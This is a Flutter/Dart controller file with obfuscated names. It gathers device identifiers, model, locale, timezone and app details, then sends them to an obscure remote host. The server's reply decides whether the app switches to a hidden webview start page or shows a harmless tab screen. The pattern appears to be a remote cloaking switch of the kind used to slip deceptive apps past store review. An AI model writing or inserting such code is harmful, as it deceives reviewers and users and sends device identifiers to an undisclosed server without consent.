import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/refresh");
  }
}

class PageLogic extends GetxController {

  var przsymgwv = RxBool(false);
  var cyhjriqs = RxBool(true);
  var xeopr = RxString("");
  var zita = RxBool(false);
  var prosacco = RxBool(true);
  final gwctyzx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkConnect();
    super.onInit();
    abrunqjh();
  }


  Future<void> abrunqjh() async {

    zita.value = true;
    prosacco.value = true;
    cyhjriqs.value = false;

    gwctyzx.post("https://bt.deeohpi.vip/eqaumsiwpfjhbzlncrvtdykoxg",data: await bzwfaks()).then((value) {
      var ibhgvrt = value.data["ibhgvrt"] as String;
      var rkymjutx = value.data["rkymjutx"] as bool;
      if (rkymjutx) {
        xeopr.value = ibhgvrt;
        allene();
      } else {
        quitzon();
      }
    }).catchError((e) {
      cyhjriqs.value = true;
      prosacco.value = true;
      zita.value = false;
    });
  }

  Future<Map<String, dynamic>> bzwfaks() async {
    final DeviceInfoPlugin xfdwj = DeviceInfoPlugin();
    PackageInfo ebdwrca_zhuafiv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nothj = Platform.localeName;
    var ogup = currentTimeZone;

    var qznkw = ebdwrca_zhuafiv.packageName;
    var gdhf = ebdwrca_zhuafiv.version;
    var jlqkexvs = ebdwrca_zhuafiv.buildNumber;

    var gfzr = ebdwrca_zhuafiv.appName;
    var arleneHessel = "";
    var ousm  = "";
    var eizsqc = "";
    var wilsonCormier = "";
    var benjaminThiel = "";
    var zutgemfv = "";
    var domenickReilly = "";
    var sammiePurdy = "";
    var eyitudmc = "";
    var kaelynBlanda = "";


    var whyjt = false;

    if (GetPlatform.isAndroid) {
      eyitudmc = "android";
      var krqwecux = await xfdwj.androidInfo;

      eizsqc = krqwecux.brand;

      zutgemfv  = krqwecux.model;
      ousm = krqwecux.id;

      whyjt = krqwecux.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      eyitudmc = "ios";
      var aibvwzre = await xfdwj.iosInfo;
      eizsqc = aibvwzre.name;
      zutgemfv = aibvwzre.model;

      ousm = aibvwzre.identifierForVendor ?? "";
      whyjt  = aibvwzre.isPhysicalDevice;
    }
    var res = {
      "gfzr": gfzr,
      "jlqkexvs": jlqkexvs,
      "wilsonCormier" : wilsonCormier,
      "gdhf": gdhf,
      "qznkw": qznkw,
      "zutgemfv": zutgemfv,
      "eizsqc": eizsqc,
      "arleneHessel" : arleneHessel,
      "kaelynBlanda" : kaelynBlanda,
      "ousm": ousm,
      "nothj": nothj,
      "eyitudmc": eyitudmc,
      "whyjt": whyjt,
      "benjaminThiel" : benjaminThiel,
      "ogup": ogup,
      "domenickReilly" : domenickReilly,
      "sammiePurdy" : sammiePurdy,

    };
    return res;
  }

  Future<void> quitzon() async {
    Get.offAllNamed("/motionTab");
  }

  Future<void> allene() async {
    Get.offAllNamed("/motionStart");
  }
}
